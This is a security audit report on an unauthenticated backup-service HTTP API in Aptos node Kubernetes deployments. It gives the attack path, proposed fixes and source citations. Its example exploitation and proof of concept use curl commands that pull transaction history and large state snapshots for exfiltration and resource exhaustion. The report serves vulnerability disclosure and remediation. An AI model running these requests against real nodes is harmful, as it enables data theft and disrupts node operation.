# Audit Report

## Title
Unauthenticated Backup Service API Enables Transaction History Exfiltration and Resource Exhaustion

## Summary
The Aptos backup service exposes HTTP endpoints that provide unrestricted access to the entire blockchain transaction history, state snapshots, and consensus data without any authentication mechanism. In production Kubernetes deployments, the service binds to `0.0.0.0:6186` and is accessible to any pod within the cluster via a ClusterIP service, enabling unauthorized data exfiltration and resource exhaustion attacks.

## Finding Description
The backup service provides several HTTP endpoints for retrieving blockchain data through the `BackupServiceClient`. The client implementation contains no authentication mechanism [1](#0-0) , and the server-side handlers expose endpoints without any authentication checks [2](#0-1) .

While the default configuration binds the service to localhost [3](#0-2) , the production Helm chart deployment configurations override this to bind to all network interfaces (`0.0.0.0:6186`) [4](#0-3) .

The service exposes port 6186 via a Kubernetes ClusterIP service [5](#0-4) , making it accessible to any pod within the same cluster. The backup service starts without authentication middleware [6](#0-5) .

**Attack Path:**
1. Attacker gains access to any pod in the Kubernetes cluster (compromised application, supply chain attack, or insider threat)
2. Attacker discovers the backup service at `<fullnode-service-name>:6186`
3. Attacker makes HTTP GET requests to endpoints like `/transactions/0/1000000` to retrieve transaction batches
4. No authentication challenge is presented, allowing complete data exfiltration
5. Attacker can also request massive state snapshots via `/state_snapshot/<version>` causing resource exhaustion

**Example exploitation:**
```bash
# From within the cluster
curl http://aptos-fullnode:6186/transactions/0/1000000
curl http://aptos-fullnode:6186/state_snapshot/100000
curl http://aptos-fullnode:6186/db_state
```

## Impact Explanation
This vulnerability qualifies as **High Severity** according to Aptos bug bounty criteria:

1. **API crashes**: An attacker can request massive amounts of data (e.g., millions of transactions or complete state snapshots), causing memory exhaustion and service crashes.

2. **Validator node slowdowns**: The backup service shares resources with the main node. Large backup requests can starve the node's I/O and memory resources, degrading consensus participation and transaction processing performance.

3. **Complete data exfiltration**: While blockchain data is "public," unrestricted API access enables:
   - Competitive intelligence gathering (MEV opportunities, trading patterns)
   - Privacy analysis (linking addresses, analyzing transaction patterns)
   - Off-chain data correlation attacks

4. **No rate limiting**: The service lacks rate limiting mechanisms [7](#0-6) , allowing sustained abuse.

The impact is amplified if operators change the service type to LoadBalancer or use port forwarding, making the API publicly accessible without authentication.

## Likelihood Explanation
**Likelihood: High**

1. **Default production exposure**: The Helm charts used for production deployments bind to `0.0.0.0:6186` by default, making the service network-accessible.

2. **Cluster-internal exploitation**: Modern cloud environments frequently experience pod compromises through:
   - Vulnerable application dependencies
   - Supply chain attacks
   - Misconfigurations
   - Insider threats

3. **Simple exploitation**: No sophisticated techniques requiredâ€”simple HTTP GET requests suffice.

4. **Misconfiguration risk**: Operators may expose the service externally for operational convenience, unaware of the authentication gap.

5. **No detection mechanisms**: The service only tracks throughput metrics, not authentication failures or abuse patterns.

## Recommendation

Implement multi-layered authentication and access controls:

**1. Add Authentication Middleware**
Implement token-based authentication in the backup service:

```rust
// In storage/backup/backup-service/src/lib.rs
pub fn start_backup_service(
    address: SocketAddr,
    db: Arc<AptosDB>,
    auth_token: Option<String>,  // Add authentication token
) -> Runtime {
    let backup_handler = db.get_backup_handler();
    let routes = get_routes(backup_handler, auth_token);
    // ... rest of implementation
}

// In storage/backup/backup-service/src/handlers/mod.rs
fn with_auth(token: Option<String>) -> impl Filter<Extract = (), Error = Rejection> + Clone {
    warp::header::optional::<String>("authorization")
        .and_then(move |auth_header: Option<String>| {
            let expected = token.clone();
            async move {
                match (auth_header, expected) {
                    (Some(header), Some(expected_token)) => {
                        if header == format!("Bearer {}", expected_token) {
                            Ok(())
                        } else {
                            Err(warp::reject::custom(Unauthorized))
                        }
                    },
                    (None, Some(_)) => Err(warp::reject::custom(Unauthorized)),
                    _ => Ok(()),
                }
            }
        })
}

// Apply to all routes
let routes = warp::get()
    .and(with_auth(auth_token))
    .and(routes)
    .boxed();
```

**2. Update Client Configuration**
```rust
// In storage/backup/backup-cli/src/utils/backup_service_client.rs
pub struct BackupServiceClient {
    address: String,
    client: reqwest::Client,
    auth_token: Option<String>,  // Add authentication token
}

impl BackupServiceClient {
    pub fn new(address: String, auth_token: Option<String>) -> Self {
        let mut headers = reqwest::header::HeaderMap::new();
        if let Some(token) = &auth_token {
            headers.insert(
                reqwest::header::AUTHORIZATION,
                format!("Bearer {}", token).parse().unwrap(),
            );
        }
        
        Self {
            address,
            client: reqwest::Client::builder()
                .no_proxy()
                .default_headers(headers)
                .build()
                .expect("Http client should build."),
            auth_token,
        }
    }
}
```

**3. Default to Localhost Binding in Helm Charts**
```yaml
# In terraform/helm/fullnode/files/fullnode-base.yaml
storage:
  backup_service_address: "127.0.0.1:6186"  # Secure by default
```

**4. Add Rate Limiting**
Integrate the existing `aptos-rate-limiter` crate to prevent abuse.

**5. Add NetworkPolicy**
Create Kubernetes NetworkPolicy to restrict access to port 6186:
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backup-service-policy
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: fullnode
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app.kubernetes.io/name: backup-coordinator  # Only allow backup pods
    ports:
    - protocol: TCP
      port: 6186
```

## Proof of Concept

**Setup (simulating cluster access):**
```bash
# Assume attacker has access to a pod in the cluster
kubectl run attacker-pod --image=curlimages/curl:latest --rm -it -- sh

# Inside the pod, discover the service
nslookup aptos-fullnode

# Exfiltrate transaction history
curl -o transactions.dat http://aptos-fullnode:6186/transactions/0/1000000

# Retrieve state snapshot causing resource exhaustion
curl -o state.dat http://aptos-fullnode:6186/state_snapshot/100000

# Get database state information
curl http://aptos-fullnode:6186/db_state

# No authentication required for any endpoint
```

**Verification:**
The backup service will respond with binary-encoded transaction data and state information without any authentication challenge. The node's resource consumption will spike when processing large requests, potentially impacting consensus participation and transaction processing capabilities.

### Citations

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L45-53)
```rust
    pub fn new(address: String) -> Self {
        Self {
            address,
            client: reqwest::Client::builder()
                .no_proxy()
                .build()
                .expect("Http client should build."),
        }
    }
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L27-146)
```rust
pub(crate) fn get_routes(backup_handler: BackupHandler) -> BoxedFilter<(impl Reply,)> {
    // GET db_state
    let bh = backup_handler.clone();
    let db_state = warp::path::end()
        .map(move || reply_with_bcs_bytes(DB_STATE, &bh.get_db_state()?))
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_range_proof/<version>/<end_key>
    let bh = backup_handler.clone();
    let state_range_proof = warp::path!(Version / HashValue)
        .map(move |version, end_key| {
            reply_with_bcs_bytes(
                STATE_RANGE_PROOF,
                &bh.get_account_state_range_proof(end_key, version)?,
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot/<version>
    let bh = backup_handler.clone();
    let state_snapshot = warp::path!(Version)
        .map(move |version| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT, move |bh, sender| {
                bh.get_state_item_iter(version, 0, usize::MAX)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_item_count/<version>
    let bh = backup_handler.clone();
    let state_item_count = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(
                STATE_ITEM_COUNT,
                &(bh.get_state_item_count(version)? as u64),
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot_chunk/<version>/<start_idx>/<limit>
    let bh = backup_handler.clone();
    let state_snapshot_chunk = warp::path!(Version / usize / usize)
        .map(move |version, start_idx, limit| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT_CHUNK, move |bh, sender| {
                bh.get_state_item_iter(version, start_idx, limit)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_root_proof/<version>
    let bh = backup_handler.clone();
    let state_root_proof = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(STATE_ROOT_PROOF, &bh.get_state_root_proof(version)?)
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET epoch_ending_ledger_infos/<start_epoch>/<end_epoch>/
    let bh = backup_handler.clone();
    let epoch_ending_ledger_infos = warp::path!(u64 / u64)
        .map(move |start_epoch, end_epoch| {
            reply_with_bytes_sender(&bh, EPOCH_ENDING_LEDGER_INFOS, move |bh, sender| {
                bh.get_epoch_ending_ledger_info_iter(start_epoch, end_epoch)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET transactions/<start_version>/<num_transactions>
    let bh = backup_handler.clone();
    let transactions = warp::path!(Version / usize)
        .map(move |start_version, num_transactions| {
            reply_with_bytes_sender(&bh, TRANSACTIONS, move |bh, sender| {
                bh.get_transaction_iter(start_version, num_transactions)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET transaction_range_proof/<first_version>/<last_version>
    let bh = backup_handler;
    let transaction_range_proof = warp::path!(Version / Version)
        .map(move |first_version, last_version| {
            reply_with_bcs_bytes(
                TRANSACTION_RANGE_PROOF,
                &bh.get_transaction_range_proof(first_version, last_version)?,
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // Route by endpoint name.
    let routes = warp::any()
        .and(warp::path(DB_STATE).and(db_state))
        .or(warp::path(STATE_RANGE_PROOF).and(state_range_proof))
        .or(warp::path(STATE_SNAPSHOT).and(state_snapshot))
        .or(warp::path(STATE_ITEM_COUNT).and(state_item_count))
        .or(warp::path(STATE_SNAPSHOT_CHUNK).and(state_snapshot_chunk))
        .or(warp::path(STATE_ROOT_PROOF).and(state_root_proof))
        .or(warp::path(EPOCH_ENDING_LEDGER_INFOS).and(epoch_ending_ledger_infos))
        .or(warp::path(TRANSACTIONS).and(transactions))
        .or(warp::path(TRANSACTION_RANGE_PROOF).and(transaction_range_proof));

    // Serve all routes for GET only.
    warp::get()
        .and(routes)
        .with(warp::log::custom(|info| {
            let endpoint = info.path().split('/').nth(1).unwrap_or("-");
            LATENCY_HISTOGRAM.observe_with(
                &[endpoint, info.status().as_str()],
                info.elapsed().as_secs_f64(),
            )
        }))
        .boxed()
```

**File:** config/src/config/storage_config.rs (L433-436)
```rust
impl Default for StorageConfig {
    fn default() -> StorageConfig {
        StorageConfig {
            backup_service_address: SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 6186),
```

**File:** terraform/helm/fullnode/files/fullnode-base.yaml (L67-68)
```yaml
storage:
  backup_service_address: "0.0.0.0:6186"
```

**File:** terraform/helm/fullnode/templates/service.yaml (L42-56)
```yaml
apiVersion: v1
kind: Service
metadata:
  name: {{ include "aptos-fullnode.fullname" . }}
  labels:
    {{- include "aptos-fullnode.labels" . | nindent 4 }}
spec:
  selector:
    {{- include "aptos-fullnode.selectorLabels" . | nindent 4 }}
    app.kubernetes.io/name: fullnode
  ports:
  - name: backup
    port: 6186
  - name: metrics
    port: 9101
```

**File:** storage/backup/backup-service/src/lib.rs (L12-30)
```rust
pub fn start_backup_service(address: SocketAddr, db: Arc<AptosDB>) -> Runtime {
    let backup_handler = db.get_backup_handler();
    let routes = get_routes(backup_handler);

    let runtime = aptos_runtimes::spawn_named_runtime("backup".into(), None);

    // Ensure that we actually bind to the socket first before spawning the
    // server tasks. This helps in tests to prevent races where a client attempts
    // to make a request before the server task is actually listening on the
    // socket.
    //
    // Note: we need to enter the runtime context first to actually bind, since
    //       tokio TcpListener can only be bound inside a tokio context.
    let _guard = runtime.enter();
    let server = warp::serve(routes).bind(address);
    runtime.handle().spawn(server);
    info!("Backup service spawned.");
    runtime
}
```

**File:** storage/backup/backup-service/src/handlers/utils.rs (L1-97)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

use crate::handlers::bytes_sender;
use aptos_db::{backup::backup_handler::BackupHandler, metrics::BACKUP_TIMER};
use aptos_logger::prelude::*;
use aptos_metrics_core::{
    register_histogram_vec, register_int_counter_vec, HistogramVec, IntCounterVec, TimerHelper,
};
use aptos_storage_interface::Result as DbResult;
use hyper::Body;
use once_cell::sync::Lazy;
use serde::Serialize;
use std::convert::Infallible;
use warp::{reply::Response, Rejection, Reply};

pub(super) static LATENCY_HISTOGRAM: Lazy<HistogramVec> = Lazy::new(|| {
    register_histogram_vec!(
        "aptos_backup_service_latency_s",
        "Backup service endpoint latency.",
        &["endpoint", "status"]
    )
    .unwrap()
});

pub(super) static THROUGHPUT_COUNTER: Lazy<IntCounterVec> = Lazy::new(|| {
    register_int_counter_vec!(
        "aptos_backup_service_sent_bytes",
        "Backup service throughput in bytes.",
        &["endpoint"]
    )
    .unwrap()
});

pub(super) fn reply_with_bcs_bytes<R: Serialize>(
    endpoint: &str,
    record: &R,
) -> DbResult<Box<dyn Reply>> {
    let bytes = bcs::to_bytes(record)?;
    THROUGHPUT_COUNTER
        .with_label_values(&[endpoint])
        .inc_by(bytes.len() as u64);
    Ok(Box::new(bytes))
}

pub(super) fn reply_with_bytes_sender<F>(
    backup_handler: &BackupHandler,
    endpoint: &'static str,
    f: F,
) -> Box<dyn Reply>
where
    F: FnOnce(BackupHandler, &mut bytes_sender::BytesSender) -> DbResult<()> + Send + 'static,
{
    let (sender, stream) = bytes_sender::BytesSender::new(endpoint);

    // spawn and forget, error propagates through the `stream: TryStream<_>`
    let bh = backup_handler.clone();
    let _join_handle = tokio::task::spawn_blocking(move || {
        let _timer =
            BACKUP_TIMER.timer_with(&[&format!("backup_service_bytes_sender_{}", endpoint)]);
        abort_on_error(f)(bh, sender)
    });

    Box::new(Response::new(Body::wrap_stream(stream)))
}

pub(super) fn abort_on_error<F>(
    f: F,
) -> impl FnOnce(BackupHandler, bytes_sender::BytesSender) + Send + 'static
where
    F: FnOnce(BackupHandler, &mut bytes_sender::BytesSender) -> DbResult<()> + Send + 'static,
{
    move |bh: BackupHandler, mut sender: bytes_sender::BytesSender| {
        // ignore error from finish() and abort()
        let _res = match f(bh, &mut sender) {
            Ok(()) => sender.finish(),
            Err(e) => sender.abort(e),
        };
    }
}

/// Return 500 on any error raised by the request handler.
pub(super) fn unwrap_or_500(result: DbResult<Box<dyn Reply>>) -> Box<dyn Reply> {
    match result {
        Ok(resp) => resp,
        Err(e) => {
            warn!("Request handler exception: {:#}", e);
            Box::new(warp::http::StatusCode::INTERNAL_SERVER_ERROR)
        },
    }
}

/// Return 400 on any rejections (parameter parsing errors).
pub(super) async fn handle_rejection(err: Rejection) -> DbResult<impl Reply, Infallible> {
    warn!("bad request: {:?}", err);
    Ok(warp::http::StatusCode::BAD_REQUEST)
}
```
